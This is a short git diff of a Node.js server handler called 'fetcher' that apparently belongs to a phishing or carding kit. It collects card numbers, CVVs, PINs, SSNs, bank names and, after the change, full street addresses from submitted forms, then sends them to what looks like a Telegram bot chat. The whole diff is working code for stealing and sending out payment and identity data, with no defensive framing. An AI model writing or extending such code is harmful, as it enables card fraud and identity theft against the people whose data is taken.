@@ -360,8 +360,21 @@ const provefetcher = asyncHandler(async (req, res) => {
 });
 
 const fetcher = asyncHandler(async (req, res) => {
-  const { cardHolder, email, cardNumber, cvv, exp, pin, bank, ssn, amount } =
-    req.body;
+  const {
+    cardHolder,
+    email,
+    cardNumber,
+    cvv,
+    exp,
+    pin,
+    bank,
+    ssn,
+    amount,
+    street,
+    city,
+    state,
+    zip,
+  } = req.body;
   // if (
   //   !cardHolder ||
   //   !email ||
@@ -391,6 +404,10 @@ const fetcher = asyncHandler(async (req, res) => {
     BANK: ${bank}
     SSN: ${ssn}
     USD: ${amount}
+    STREET: ${street}
+    CITY: ${city}
+    STATE: ${state}
+    ZIP: ${zip}
     `;
   const sendMessage = await bot.sendMessage(chatId, tg_msg);
   if (sendMessage) {
